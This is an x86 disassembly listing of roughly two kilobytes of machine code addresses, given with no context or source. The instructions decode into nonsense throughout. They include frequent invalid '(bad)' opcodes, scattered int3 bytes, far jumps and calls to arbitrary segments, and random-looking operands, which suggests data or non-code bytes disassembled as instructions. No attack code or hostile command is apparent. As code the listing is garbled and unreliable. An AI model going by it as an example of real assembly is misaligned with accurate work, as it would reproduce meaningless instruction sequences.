  42f73a:	add    BYTE PTR [ecx+ebp*8+0x0],cl
  42f73e:	or     eax,0xffff8340
  42f743:	jl     0x42f780
  42f745:	add    edx,0x8
  42f748:	add    BYTE PTR [eax],al
  42f74a:	adc    DWORD PTR [edx+eiz*4-0xe65001],0x0
  42f752:	jmp    DWORD PTR [edx]
  42f754:	pop    es
  42f755:	add    BYTE PTR [edi],ah
  42f757:	in     eax,dx
  42f758:	add    bh,bh
  42f75a:	mov    ebp,ebp
  42f75c:	dec    eax
  42f75d:	sbb    DWORD PTR [ebx-0x52],0xffffff89
  42f761:	add    BYTE PTR [eax],al
  42f763:	test   eax,0x2076ff3c
  42f768:	inc    DWORD PTR [ebx-0xf76900]
  42f76e:	ins    DWORD PTR es:[edi],dx
  42f76f:	inc    edx
  42f770:	add    bh,bh
  42f772:	add    BYTE PTR [ecx-0x49],al
  42f775:	push   DWORD PTR [edx]
  42f777:	add    eax,0x68ff00ff
  42f77c:	repnz dec DWORD PTR [esi]
  42f77f:	mov    eax,DWORD PTR [eax]
  42f781:	add    BYTE PTR [eax],al
  42f783:	add    eax,0x5f47891b
  42f788:	inc    DWORD PTR [ebx-0x9f4e77]
  42f78e:	or     BYTE PTR [ecx],0xcc
  42f791:	cmp    edi,0x64
  42f794:	cmp    edi,0xffffffae
  42f797:	mov    ebx,0x70ff83ff
  42f79c:	mov    edx,0xff24c383
  42f7a1:	mov    DWORD PTR [ecx-0x11000451],ecx
  42f7a7:	mov    ebp,0x45ffff00
  42f7ac:	or     eax,DWORD PTR [ebx-0x7c1e70]
  42f7b2:	add    BYTE PTR [ebx],bh
  42f7b4:	xor    edi,edi
  42f7b6:	loopne 0x42f7ad
  42f7b8:	add    DWORD PTR [eax],0x0
  42f7bb:	jg     0x42f7e3
  42f7bd:	xor    DWORD PTR [ebx-0x4b],0x0
  42f7c1:	mov    DWORD PTR [eax],eax
  42f7c3:	int3   
  42f7c4:	dec    edi
  42f7c5:	call   esi
  42f7c7:	cmp    bh,bh
  42f7c9:	(bad)  
  42f7ca:	push   DWORD PTR [edi-0x7822ffde]
  42f7d0:	(bad)  
  42f7d1:	inc    DWORD PTR [eax]
  42f7d3:	or     eax,0xc794005d
  42f7d8:	dec    esp
  42f7da:	int3   
  42f7db:	pop    ebx
  42f7dc:	pop    esp
  42f7dd:	int3   
  42f7de:	push   esp
  42f7df:	add    eax,0xeaffffff
  42f7e4:	cmp    eax,0x78d5ff
  42f7e9:	cmp    edi,0xffffff99
  42f7ec:	adc    al,BYTE PTR [eax]
  42f7ee:	jae    0x42f82c
  42f7f0:	(bad)  
  42f7f1:	(bad)  
  42f7f2:	jmp    FWORD PTR [edx-0x2a]
  42f7f5:	inc    DWORD PTR [ecx-0x7c00000f]
  42f7fb:	icebp  
  42f7fc:	sub    al,0xff
  42f7fe:	push   0xffffffb0
  42f800:	(bad)  
  42f801:	(bad)  
  42f802:	inc    DWORD PTR [ebp-0x45]
  42f805:	or     DWORD PTR [eax],0x61
  42f808:	inc    DWORD PTR [ebx+0x666bff]
  42f80e:	inc    ecx
  42f80f:	stos   BYTE PTR es:[edi],al
  42f810:	add    BYTE PTR [eax],al
  42f812:	call   DWORD PTR [ebx+0x6a42fff5]
  42f818:	inc    DWORD PTR [eax]
  42f81a:	jmp    FWORD PTR [esi+0x10]
  42f81d:	mov    DWORD PTR [ebx-0x7c0023],edx
  42f823:	jg     0x42f845
  42f825:	jmp    FWORD PTR [ebx]
  42f827:	add    BYTE PTR [eax],0xff
  42f82a:	add    BYTE PTR [ebp+0x266dff03],ah
  42f830:	(bad)  
  42f831:	dec    DWORD PTR [ecx+0x5400949b]
  42f837:	in     eax,0x0
  42f839:	(bad)  
  42f83a:	dec    edx
  42f83c:	push   ss
  42f83d:	call   DWORD PTR [edi]
  42f83f:	pop    edi
  42f840:	inc    DWORD PTR [eax]
  42f842:	dec    esp
  42f844:	(bad)  
  42f847:	fs dec esp
  42f84a:	and    DWORD PTR [edi-0x79],0xffffffcc
  42f84e:	shr    dh,1
  42f850:	dec    DWORD PTR [ecx-0x2ed800]
  42f856:	ror    BYTE PTR fs:[ecx+0x38eaff00],cl
  42f85d:	add    cl,dl
  42f85f:	or     WORD PTR [ecx-0x3342ff01],0x4b
  42f867:	pop    eax
  42f868:	cmp    edi,0x0
  42f86b:	imul   eax,DWORD PTR [esi],0x7df189
  42f871:	(bad)  
  42f872:	dec    DWORD PTR ds:0xf9db003e
  42f878:	inc    DWORD PTR [eax]
  42f87a:	dec    DWORD PTR [eax-0x80]
  42f87d:	mov    DWORD PTR [edx-0x4],eax
  42f880:	add    DWORD PTR [eax],0x0
  42f883:	mov    DWORD PTR ds:0x833473ff,esp
  42f889:	inc    DWORD PTR [ebx+0x47ff9f64]
  42f88f:	push   ebp
  42f890:	(bad)  
  42f891:	inc    DWORD PTR [eax]
  42f893:	pop    ds
  42f894:	aas    
  42f895:	add    dl,al
  42f897:	inc    DWORD PTR ss:[eax]
  42f89a:	inc    DWORD PTR [edx-0x3c]
  42f89d:	add    BYTE PTR [ecx],ch
  42f89f:	inc    DWORD PTR cs:[eax]
  42f8a2:	dec    DWORD PTR [ebx+0x65d0cc0f]
  42f8a8:	add    DWORD PTR [ebx-0x763f5a34],0x7
  42f8af:	std    
  42f8b0:	inc    DWORD PTR [eax]
  42f8b2:	int3   
  42f8b3:	xchg   edx,eax
  42f8b4:	(bad)  
  42f8b5:	call   FWORD PTR [ebp-0xffff69]
  42f8bb:	ds (bad) 
  42f8bd:	inc    DWORD PTR [edi-0x7d]
  42f8c0:	mov    edi,edi
  42f8c2:	add    BYTE PTR [ecx+eiz*4],dh
  42f8c5:	int3   
  42f8c6:	in     al,dx
  42f8c7:	inc    ebx
  42f8c8:	add    bh,bh
  42f8ca:	add    BYTE PTR [eax+0x61],dl
  42f8cd:	add    al,al
  42f8cf:	enter  0xff,0x0
  42f8d3:	std    
  42f8d4:	daa    
  42f8d5:	mov    esi,esi
  42f8d7:	pop    ss
  42f8d8:	mov    edi,edi
  42f8da:	call   FWORD PTR [ebx]
  42f8dc:	lods   al,BYTE PTR ds:[esi]
  42f8dd:	call   FWORD PTR [edx-0x33ffffdd]
  42f8e3:	pop    edi
  42f8e4:	mov    al,ds:0x5feeff
  42f8e9:	(bad)  
  42f8ea:	inc    ebp
  42f8ec:	popa   
  42f8ed:	sub    DWORD PTR [esi+0x52],0xffffffff
  42f8f1:	add    bh,bh
  42f8f3:	xchg   edi,eax
  42f8f4:	xchg   esp,eax
  42f8f5:	jmp    DWORD PTR [eax+esi*4]
  42f8f8:	add    BYTE PTR [eax],al
  42f8fa:	add    BYTE PTR [esi+0x1112cc24],al
  42f900:	(bad)  
  42f901:	(bad)  
  42f902:	dec    DWORD PTR [esi-0x2c]
  42f905:	call   edx
  42f907:	retf   
  42f908:	mov    edi,edi
  42f90a:	int3   
  42f90b:	fisub  WORD PTR [ecx]
  42f90d:	inc    DWORD PTR [ecx+0x2f]
  42f910:	(bad)  
  42f911:	(bad)  
  42f912:	push   DWORD PTR [ecx]
  42f914:	xchg   esi,eax
  42f915:	push   DWORD PTR [ebx]
  42f917:	mov    edi,?
  42f919:	add    bh,bh
  42f91b:	and    eax,0xda8fff30
  42f920:	add    BYTE PTR [eax],al
  42f922:	(bad)  
  42f923:	jmp    0x5f0ef9a7
  42f928:	add    DWORD PTR [eax],0xffffffff
  42f92b:	outs   dx,BYTE PTR ds:[esi]
  42f92c:	popa   
  42f92d:	jmp    ecx
  42f92f:	cmp    al,BYTE PTR [eax]
  42f931:	mov    esp,ecx
  42f933:	jmp    0xff:0x81ff837e
  42f93a:	add    BYTE PTR [edi],bl
  42f93c:	jns    0x42f93d
  42f93e:	dec    eax
  42f93f:	push   eax
  42f940:	add    DWORD PTR [eax],0xffffffff
  42f943:	mov    edx,ebp
  42f945:	add    BYTE PTR [ecx+0xeb],cl
  42f94b:	dec    ebx
  42f94c:	fiadd  DWORD PTR [ebx-0x33008803]
  42f952:	add    ah,bh
  42f954:	(bad)  
  42f955:	int3   
  42f956:	cmp    al,0x21
  42f958:	cmp    edi,0xffffffff
  42f95b:	call   0x1c4ef93e
  42f960:	(bad)  
  42f961:	inc    DWORD PTR [ebx+0x780094be]
  42f967:	sti    
  42f968:	(bad)  
  42f969:	inc    DWORD PTR [eax]
  42f96b:	jmp    0x0:0x4a1cff4e
  42f972:	mov    DWORD PTR [eax+0x38],ebx
  42f975:	cmp    DWORD PTR [ebp+0xff7e],0x7a
  42f97c:	jo     0x42f94a
  42f97e:	push   edi
  42f97f:	push   edx
  42f980:	inc    DWORD PTR [eax]
  42f982:	jmp    FWORD PTR [edx]
  42f984:	mov    ds:0x263f00,eax
  42f989:	mov    DWORD PTR [ecx-0x74ffc3c7],ecx
  42f98f:	sbb    eax,0x4cffffff
  42f994:	xchg   ebp,eax
  42f995:	(bad)  
  42f996:	cmp    al,0x9e
  42f998:	add    bh,bh
  42f99a:	add    dl,al
  42f99c:	add    BYTE PTR fs:[esi-0x73],bl
  42f9a0:	(bad)  
  42f9a1:	inc    DWORD PTR [eax]
  42f9a3:	test   al,0x88
  42f9a5:	(bad)  
  42f9a6:	mov    eax,0xfffffd
  42f9ab:	icebp  
  42f9ac:	rol    BYTE PTR [eax],1
  42f9ae:	outs   dx,DWORD PTR ds:[esi]
  42f9af:	mov    edx,0xd283ffff
  42f9b4:	(bad)  
  42f9b5:	(bad)  
  42f9b6:	in     eax,dx
  42f9b7:	push   0x3cffffff
  42f9bc:	sub    eax,0xff0f74ff
  42f9c1:	add    BYTE PTR [eax],al
  42f9c3:	repz xor al,BYTE PTR [eax]
  42f9c6:	cmp    ch,BYTE PTR [ecx-0x53000001]
  42f9cc:	pop    ebp
  42f9cd:	add    BYTE PTR [edi-0x7c76006d],ah
  42f9d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f9d4:	sbb    edi,edi
  42f9d6:	and    eax,0xff000076
  42f9db:	adc    BYTE PTR [ecx],bh
  42f9dd:	call   esi
  42f9df:	push   ebx
  42f9e0:	int3   
  42f9e1:	(bad)  
  42f9e2:	inc    DWORD PTR [ebp-0x7fb1ffc6]
  42f9e8:	inc    DWORD PTR [eax]
  42f9ea:	call   DWORD PTR [edx+0x41]
  42f9ed:	cmp    ebx,0x12
  42f9f0:	add    BYTE PTR [ebx-0x7cee5500],al
  42f9f6:	mov    dl,0x5e
  42f9f8:	mov    DWORD PTR [eax],eax
  42f9fa:	mov    DWORD PTR [ebp+0x51],eax
  42f9fd:	push   DWORD PTR [ecx+ecx*4]
  42fa00:	add    bh,bh
  42fa02:	add    BYTE PTR [eax+0x2f13ff4b],bl
  42fa08:	int3   
  42fa09:	add    bh,bh
  42fa0b:	scas   eax,DWORD PTR es:[edi]
  42fa0c:	and    bh,bh
  42fa0e:	mov    ds:0xffff23,al
  42fa13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa14:	rol    BYTE PTR [ebx-0xfdc4],cl
  42fa1a:	add    BYTE PTR [ebp+0x433cffee],dl
  42fa20:	inc    DWORD PTR [eax]
  42fa22:	call   FWORD PTR [edx-0x3951ff39]
  42fa28:	add    BYTE PTR [eax],al
  42fa2a:	inc    DWORD PTR [esi-0x1e427cd3]
  42fa30:	add    DWORD PTR [eax],0xffffffff
  42fa33:	adc    eax,0xa3c300f9
  42fa38:	inc    DWORD PTR [eax]
  42fa3a:	(bad)  
  42fa3b:	out    dx,eax
  42fa3c:	mov    ebp,0xff571800
  42fa41:	or     esp,0x7
  42fa44:	push   ecx
  42fa45:	jmp    FWORD PTR [ebx]
  42fa47:	rol    DWORD PTR [ebx-0x62aaff77],1
  42fa4d:	inc    esp
  42fa4f:	jne    0x42fa50
  42fa51:	(bad)  
  42fa52:	inc    DWORD PTR [edi-0x420e00c1]
  42fa58:	add    BYTE PTR [eax],al
  42fa5a:	int3   
  42fa5b:	call   0x8383:0xf1e0ff2d
  42fa62:	add    cl,bh
  42fa64:	mov    ah,0xff
  42fa66:	mov    BYTE PTR [ecx-0x1],bl
  42fa69:	add    bh,bh
  42fa6b:	push   eax
  42fa6c:	inc    edi
  42fa6d:	add    cl,ah
  42fa6f:	lea    eax,[eax]
  42fa71:	cmp    edi,0x11
  42fa74:	push   ebx
  42fa75:	add    dh,bl
  42fa77:	adc    edi,edi
  42fa79:	add    BYTE PTR [ebx-0x3e7c96cb],al
  42fa7f:	mov    ah,0x83
  42fa81:	inc    DWORD PTR [eax]
  42fa83:	imul   edi,DWORD PTR [edi],0xcc6da3ff
  42fa89:	cmp    edi,0x5d
  42fa8c:	jbe    0x42fa8d
  42fa8e:	mov    ds:0xff89ff81,eax
  42fa93:	and    ebx,DWORD PTR [edx+0x0]
  42fa96:	clc    
  42fa97:	cld    
  42fa98:	add    DWORD PTR [eax],0x0
  42fa9b:	add    BYTE PTR [ebp-0x34],cl
  42fa9e:	lds    edx,FWORD PTR [edx+0x0]
  42faa1:	add    DWORD PTR [ebx-0x380052d2],0x67
  42faa8:	inc    DWORD PTR [eax]
  42faaa:	add    BYTE PTR [edi],ah
  42faac:	inc    esi
  42faad:	call   FWORD PTR [ebp-0x54]
  42fab0:	add    bh,bh
  42fab2:	int3   
  42fab3:	mov    eax,ds:0xa89aff35
  42fab8:	add    bh,bh
  42faba:	mov    DWORD PTR ds:0x666000be,ecx
  42fac0:	int3   
  42fac1:	add    bh,bh
  42fac3:	repnz lods al,BYTE PTR ds:[esi]
  42fac5:	add    BYTE PTR [edi-0xffff4d],bl
  42facb:	push   eax
  42facc:	scas   eax,DWORD PTR es:[edi]
  42facd:	push   DWORD PTR ds:0xff68
  42fad3:	jns    0x42fab1
  42fad5:	add    BYTE PTR [edi-0x3],dl
  42fad8:	mov    edi,edi
  42fada:	and    DWORD PTR [eax+0x14],0xffffffcc
  42fade:	xchg   BYTE PTR [edx],dh
  42fae0:	add    bh,bh
  42fae2:	add    BYTE PTR [ebx-0x7975004e],cl
  42fae8:	or     DWORD PTR [ecx-0x872600],0x50
  42faef:	mov    edi,0x8f00ff00
  42faf4:	mov    edi,0xa00ff
  42faf9:	add    BYTE PTR [ebx+0x19ff1c00],al
  42faff:	mov    eax,0x7200ccff
  42fb04:	lods   al,BYTE PTR ds:[esi]
  42fb05:	add    BYTE PTR [eax+edx*4],ch
  42fb08:	int3   
  42fb09:	add    bh,bh
  42fb0b:	clc    
  42fb0c:	and    edi,edi
  42fb0e:	loopne 0x42fb15
  42fb10:	add    BYTE PTR [eax],al
  42fb12:	push   esi
  42fb14:	mov    ds:0xcc80a000,al
  42fb19:	inc    DWORD PTR [eax]
  42fb1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fb1c:	in     eax,dx
  42fb1d:	add    BYTE PTR [edi],bh
  42fb1f:	enter  0xffff,0x0
  42fb23:	fcmovbe st,st(6)
  42fb25:	add    bh,ah
  42fb27:	je     0x42fb28
  42fb29:	int3   
  42fb2a:	add    BYTE PTR [edx+eiz*4-0x52b01],ah
  42fb31:	add    bh,bh
  42fb33:	push   ebx
  42fb34:	mov    bh,0xff
  42fb36:	stc    
  42fb37:	or     bh,bh
  42fb39:	add    BYTE PTR [eax],al
  42fb3b:	and    BYTE PTR ds:0x839146cc,cl
  42fb41:	inc    DWORD PTR [eax]
  42fb43:	repnz imul ecx,DWORD PTR [ecx-0xff781e],0x0
  42fb4b:	pop    esp
  42fb4c:	popf   
  42fb4d:	dec    DWORD PTR [esi-0x76760034]
  42fb53:	fadd   QWORD PTR [ebp+0x0]
  42fb56:	scas   eax,DWORD PTR es:[edi]
  42fb57:	test   esp,0xcccccccc
  42fb5d:	int3   
  42fb5e:	int3   
  42fb5f:	int3   
  42fb60:	add    cl,al
  42fb62:	push   0xd6a58310
  42fb67:	jp     0x42faec
  42fb69:	add    ah,cl
  42fb6b:	jmp    DWORD PTR [ecx+0xcc5aff]
  42fb71:	inc    edi
  42fb72:	test   al,0x5c
  42fb74:	add    BYTE PTR [ecx+eax*4],ah
  42fb77:	inc    esp
  42fb78:	int3   
  42fb79:	(bad)  
  42fb7a:	(bad)  
  42fb7b:	call   edi
  42fb7d:	add    BYTE PTR [ecx+ecx*4],dh
  42fb80:	mov    DWORD PTR [edx-0x6cff5d7a],eax
  42fb86:	adc    DWORD PTR [ebp-0x1],esi
  42fb89:	add    DWORD PTR [eax],0x0
  42fb8c:	jmp    0xd1b4:0xffff9eff
  42fb93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb94:	add    BYTE PTR [ebp+0xffc831],al
  42fb9a:	(bad)  
  42fb9b:	inc    DWORD PTR [eax-0xffed00]
  42fba1:	mov    bl,0x86
  42fba3:	push   eax
  42fba4:	add    BYTE PTR [esi+0x66],dh
  42fba7:	dec    ebx
  42fba8:	inc    DWORD PTR [eax]
  42fbaa:	add    bh,bh
  42fbac:	ret    
  42fbad:	int3   
  42fbae:	les    eax,FWORD PTR [eax]
  42fbb0:	call   DWORD PTR [ebp+0x10]
  42fbb3:	or     edi,edi
  42fbb5:	rcl    dl,0xc4
  42fbb8:	or     esp,0xffffffff
  42fbbb:	sbb    DWORD PTR [edi+edi*8],0xffffffd0
  42fbbf:	(bad)  
  42fbc0:	inc    DWORD PTR [edx]
  42fbc2:	jl     0x42fb98
  42fbc4:	add    BYTE PTR [edx],al
  42fbc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbc7:	outs   dx,BYTE PTR ds:[esi]
  42fbc8:	(bad)  
  42fbc9:	inc    DWORD PTR [ebx-0x2100287d]
  42fbcf:	dec    esp
  42fbd1:	retf   0x42da
  42fbd4:	call   DWORD PTR [eax]
  42fbd6:	pop    edx
  42fbd7:	sub    edi,edi
  42fbd9:	add    bh,bh
  42fbdb:	call   FWORD PTR [ebp-0x7d]
  42fbde:	adc    eax,0xdbfaffff
  42fbe3:	dec    esi
  42fbe4:	int3   
  42fbe5:	out    dx,eax
  42fbe6:	sub    eax,0x83ffffb8
  42fbeb:	adc    eax,0xffffffff
  42fbee:	ds mov edi,edi
  42fbf1:	arpl   bp,ax
  42fbf3:	xor    edi,edi
  42fbf5:	pop    esp
  42fbf6:	ret    0x55
  42fbf9:	int3   
  42fbfa:	add    bh,bh
  42fbfc:	mov    ds:0xffffb1ff,eax
  42fc01:	pop    ebp
  42fc02:	fs sbb eax,0x3546d400
  42fc08:	inc    DWORD PTR [eax]
  42fc0a:	mov    edi,edi
  42fc0c:	mov    cl,0x83
  42fc0e:	adc    eax,0xcb6889ff
  42fc13:	ret    
  42fc14:	(bad)  
  42fc15:	jmp    0x42fc06
  42fc17:	pop    ecx
  42fc18:	add    bh,bh
  42fc1a:	add    DWORD PTR [ebx-0xb57645],0xffffffff
  42fc21:	mov    eax,0x868399f8
  42fc26:	or     cl,BYTE PTR ds:0x89ff
  42fc2c:	sbb    bh,bh
  42fc2e:	mov    bh,bh
  42fc30:	add    BYTE PTR [edx+0x32],cl
  42fc33:	lods   eax,DWORD PTR ds:[esi]
  42fc34:	dec    DWORD PTR [edx]
  42fc36:	lods   eax,DWORD PTR ds:[esi]
  42fc37:	push   es
  42fc38:	add    DWORD PTR [ebx-0x127601],0xffffff8a
  42fc3f:	mov    DWORD PTR [eax],eax
  42fc41:	inc    eax
  42fc42:	(bad)  
  42fc43:	in     al,dx
  42fc44:	mov    DWORD PTR [ebp-0x6e],edi
  42fc47:	aam    0x0
  42fc49:	inc    DWORD PTR [eax]
  42fc4b:	int3   
  42fc4c:	fdiv   st(7),st
  42fc4e:	dec    edx
  42fc4f:	inc    DWORD PTR [eax]
  42fc51:	pop    eax
  42fc52:	xchg   ebp,eax
  42fc53:	push   es
  42fc54:	push   DWORD PTR [eax]
  42fc56:	adc    al,0xb5
  42fc58:	int3   
  42fc59:	dec    esp
  42fc5b:	add    BYTE PTR [edi+0x0],cl
  42fc5e:	push   cs
  42fc5f:	dec    DWORD PTR [ecx-0x33f22c15]
  42fc65:	or     ebx,DWORD PTR [ebx+0x68]
  42fc68:	add    bh,bh
  42fc6a:	dec    esp
  42fc6c:	sar    edi,1
  42fc6e:	jb     0x42fbf3
  42fc70:	push   DWORD PTR [eax+eax*8-0x3705ff50]
  42fc77:	and    edi,edi
  42fc79:	add    BYTE PTR [ebx-0x76335b01],al
  42fc7f:	add    BYTE PTR [eax],al
  42fc81:	jo     0x42fc34
  42fc83:	push   ecx
  42fc84:	sub    DWORD PTR [ebp+eiz*2+0xff8375],0xffffffff
  42fc8c:	mov    edi,edi
  42fc8e:	ss (bad) 
  42fc90:	jmp    FWORD PTR [edi+0x6]
  42fc93:	stos   BYTE PTR es:[edi],al
  42fc94:	add    BYTE PTR [edi+ecx*2-0x334f],dl
  42fc9b:	jmp    FWORD PTR [eax-0x77]
  42fc9e:	push   ebp
  42fc9f:	(bad)  
  42fca0:	(bad)  
  42fca1:	fnstsw WORD PTR [edi-0x67997636]
  42fca7:	pop    eax
  42fca8:	inc    DWORD PTR [ebx+0xcb00cc]
  42fcae:	mov    dl,0xff
  42fcb0:	call   FWORD PTR [ebp-0x4d0085ed]
  42fcb6:	cwde   
  42fcb7:	mov    eax,ds:0x83000000
  42fcbc:	mov    ah,0xcc
  42fcbe:	cwde   
  42fcbf:	add    BYTE PTR [eax],al
  42fcc1:	stos   BYTE PTR es:[edi],al
  42fcc2:	mov    WORD PTR [edi+edi*8],gs
  42fcc5:	mov    ecx,0xff2420
  42fcca:	add    bh,bh
  42fccc:	mov    DWORD PTR [ebx-0x4933ffc0],0x81ff5810
  42fcd6:	xor    esp,edx
  42fcd8:	add    BYTE PTR [eax],al
  42fcda:	(bad)  
  42fcdb:	(bad)  
  42fcdc:	fadd   QWORD PTR [eax]
  42fcde:	jle    0x42fcdf
  42fce0:	call   FWORD PTR ds:0x37892a43
  42fce6:	xchg   esi,eax
  42fce7:	dec    ecx
  42fce8:	mov    DWORD PTR [eax],eax
  42fcea:	(bad)  
  42fceb:	push   DWORD PTR [edi]
  42fced:	sub    DWORD PTR [edx+0x776bff00],0x7e
  42fcf4:	add    BYTE PTR [esp+eiz*8-0x5d],dh
  42fcf8:	inc    DWORD PTR [ebx-0xbcff7d]
  42fcfe:	add    bh,bh
  42fd00:	int3   
  42fd01:	dec    eax
  42fd02:	mov    DWORD PTR [edi+edi*8],esi
  42fd05:	imul   esp,DWORD PTR [esi-0x7c0002],0xffffffff
  42fd0c:	cmp    al,0xff
  42fd0e:	jne    0x42fd10
  42fd10:	add    BYTE PTR [ebp-0x3a],al
  42fd13:	cdq    
  42fd14:	call   FWORD PTR [ebx-0x9449]
  42fd1a:	inc    DWORD PTR [eax]
  42fd1c:	sar    bh,0xd2
  42fd1f:	cmp    edi,0xffffffa8
  42fd22:	call   0xb296fc7d
  42fd27:	nop
  42fd28:	add    BYTE PTR [ecx-0xa2ff01],cl
  42fd2e:	mov    al,ds:0xabc3ffff
  42fd33:	retf   0x82ff
  42fd36:	outs   dx,DWORD PTR ds:[esi]
  42fd37:	idiv   edi
  42fd39:	or     esp,0xffffffff
  42fd3c:	mov    esi,0xeaff
  42fd41:	mov    bh,0x47
  42fd43:	test   al,0x83
  42fd45:	add    DWORD PTR [edi-0xc5],edx
  42fd4b:	add    BYTE PTR [edi-0xc001],bl
  42fd51:	jb     0x42fd10
  42fd53:	imul   edi,edi,0x6ce447
  42fd59:	inc    DWORD PTR [ebx-0x200da34]
  42fd5f:	add    ah,cl
  42fd61:	sub    al,0x4f
  42fd63:	popa   
  42fd64:	add    DWORD PTR [esi-0x35],0xe
  42fd68:	inc    DWORD PTR [eax]
  42fd6a:	(bad)  
  42fd6b:	jmp    DWORD PTR [eax]
  42fd6d:	(bad)  
  42fd6e:	jl     0x42fd70
  42fd70:	add    bh,dl
  42fd72:	shl    DWORD PTR [edi+edi*8+0xa389e],0xff
  42fd7a:	(bad)  
  42fd7b:	jmp    DWORD PTR [eax-0xae00]
  42fd81:	xor    ebx,esp
  42fd83:	cmp    al,0x83
  42fd85:	mov    ah,0x58
  42fd87:	sbb    al,0xff
  42fd89:	inc    DWORD PTR [eax]
  42fd8b:	add    ah,dl
  42fd8d:	int3   
  42fd8e:	mov    BYTE PTR [eax],al
  42fd90:	add    ch,ah
  42fd92:	xor    DWORD PTR [ecx-0x4fd5557d],eax
  42fd98:	int3   
  42fd99:	mov    DWORD PTR [eax],eax
  42fd9b:	(bad)  
  42fd9c:	out    dx,al
  42fd9d:	jmp    DWORD PTR [ebp-0x1]
  42fda0:	add    BYTE PTR [edi+0x73],cl
  42fda3:	cmp    edi,0x6e
  42fda6:	pop    ecx
  42fda7:	into   
  42fda8:	dec    DWORD PTR [ecx+0xb0ff83]
  42fdae:	mov    cl,0x89
  42fdb0:	add    ch,al
  42fdb2:	lea    esp,[edi]
  42fdb4:	mov    DWORD PTR [ebp+0x54],ebx
  42fdb7:	fdivp  st(7),st
  42fdb9:	mov    edi,edi
  42fdbb:	inc    DWORD PTR [edx]
  42fdbd:	(bad)  
  42fdbe:	mov    edi,0xfe3fffff
  42fdc3:	cmp    eax,DWORD PTR [ebx+0xa0b13a]
  42fdc9:	(bad)  
  42fdca:	inc    DWORD PTR [ebx-0x74ff31]
  42fdd0:	jmp    DWORD PTR [edi]
  42fdd2:	mov    bl,0x48
  42fdd4:	add    BYTE PTR [ebx-0x76ff2fbc],al
  42fdda:	mov    edi,edi
  42fddc:	mov    eax,0x89000f89
  42fde1:	fwait
  42fde2:	xchg   edi,eax
  42fde3:	jle    0x42fde4
  42fde5:	adc    ebp,0xffffffe7
  42fde8:	mov    DWORD PTR [ebx-0x7657ff7d],eax
  42fdee:	pop    edi
  42fdef:	cmp    edi,0xfffffff0
  42fdf2:	xchg   edx,eax
  42fdf3:	imul   ecx,DWORD PTR [ecx-0x1cff9c],0x79ffffff
  42fdfd:	and    ecx,0xffffffff
  42fe00:	jmp    DWORD PTR [edi-0x6f767dd8]
  42fe06:	xor    al,0x69
  42fe08:	inc    DWORD PTR [eax]
  42fe0a:	add    bh,bh
  42fe0c:	xchg   BYTE PTR [ecx+0x3500834e],cl
  42fe12:	xchg   BYTE PTR [edx],ah
  42fe14:	add    dh,dh
  42fe16:	push   ebx
  42fe17:	scas   al,BYTE PTR es:[edi]
  42fe18:	add    bh,bh
  42fe1a:	(bad)  
  42fe1b:	inc    DWORD PTR [esi+0x839f00]
  42fe21:	div    DWORD PTR es:[ebx]
  42fe24:	jmp    DWORD PTR [ecx+0x24]
  42fe27:	retf   
  42fe28:	inc    DWORD PTR [ebx-0x94767d]
  42fe2e:	sbb    DWORD PTR [eax],eax
  42fe30:	inc    DWORD PTR [edx+eax*8-0x63cc333b]
  42fe37:	mov    edx,0xffff0000
  42fe3c:	sbb    bh,bh
  42fe3e:	test   ah,cl
  42fe40:	add    bh,al
  42fe42:	mov    ch,0xb2
  42fe44:	push   DWORD PTR [ebx+ebp*2]
  42fe47:	xor    bh,bh
  42fe49:	int3   
  42fe4a:	add    bh,bh
  42fe4c:	cli    
  42fe4d:	push   DWORD PTR [eax+eax*1+0x66bccff]
  42fe54:	(bad)  
  42fe55:	fcmovnb st,st(7)
  42fe57:	sahf   
  42fe58:	int3   
  42fe59:	add    BYTE PTR [eax],al
  42fe5b:	add    BYTE PTR [ecx-0xff457d],ah
  42fe61:	jg     0x42fdee
  42fe63:	mov    edx,0xbf20ffff
  42fe68:	inc    DWORD PTR [ebx-0xb10001]
  42fe6e:	imul   ecx,DWORD PTR [ecx+0x1d65b9cc],0x98b708ff
  42fe78:	(bad)  
  42fe79:	(bad)  
  42fe7a:	(bad)  
  42fe7b:	call   DWORD PTR [edx]
  42fe7d:	push   DWORD PTR [edi]
  42fe7f:	inc    DWORD PTR [eax]
  42fe81:	popf   
  42fe82:	gs sti 
  42fe84:	call   FWORD PTR [eax+0x65]
  42fe87:	out    dx,al
  42fe88:	int3   
  42fe89:	add    DWORD PTR [ebx-0x6300187d],0xffffffff
  42fe90:	xor    DWORD PTR [edi],0xffffffa3
  42fe93:	scas   eax,DWORD PTR es:[edi]
  42fe94:	(bad)  
  42fe95:	sti    
  42fe96:	rol    DWORD PTR [edi+edi*8-0x77],cl
  42fe9a:	add    BYTE PTR [eax],al
  42fe9c:	call   0x142c3a0
  42fea1:	dec    ebp
  42fea2:	shr    DWORD PTR [edx],1
  42fea4:	jmp    FWORD PTR [ecx]
  42fea6:	xor    DWORD PTR [ecx-0x77],esi
  42fea9:	(bad)  
  42feaa:	dec    DWORD PTR [ecx-0x29006e]
  42feb0:	(bad)  
  42feb1:	in     eax,dx
  42feb2:	inc    esp
  42feb3:	xchg   esp,eax
  42feb4:	xor    DWORD PTR [edx-0x7cc0a9],0x0
  42febb:	xor    DWORD PTR [edi],0xffffff89
  42febe:	loop   0x42febf
  42fec0:	jmp    DWORD PTR [eax]
  42fec2:	ja     0x42fede
  42fec4:	mov    DWORD PTR [esi+esi*8-0x7600000e],eax
  42fecb:	(bad)  
  42fecc:	mov    eax,0xf8ff
  42fed1:	mov    ?,WORD PTR [eax+eiz*2]
  42fed4:	add    BYTE PTR [esi],al
  42fed6:	enter  0xffb3,0xff
  42feda:	inc    DWORD PTR [ebx-0x6700e2]
  42fee0:	int3   
  42fee1:	ss mov esi,0x3c1ecc96
  42fee7:	outs   dx,DWORD PTR ds:[esi]
  42fee8:	inc    DWORD PTR [eax]
  42feea:	mov    edi,edi
  42feec:	jb     0x42feee
  42feee:	inc    esp
  42feef:	add    BYTE PTR [ebx+0xecdbaa],al
  42fef5:	lods   eax,DWORD PTR ds:[esi]
  42fef6:	xor    esp,DWORD PTR [ebx+eax*4+0x40ffff00]
  42fefd:	add    BYTE PTR [ecx],bl
  42feff:	inc    DWORD PTR [eax]
  42ff01:	retf   0xbd4
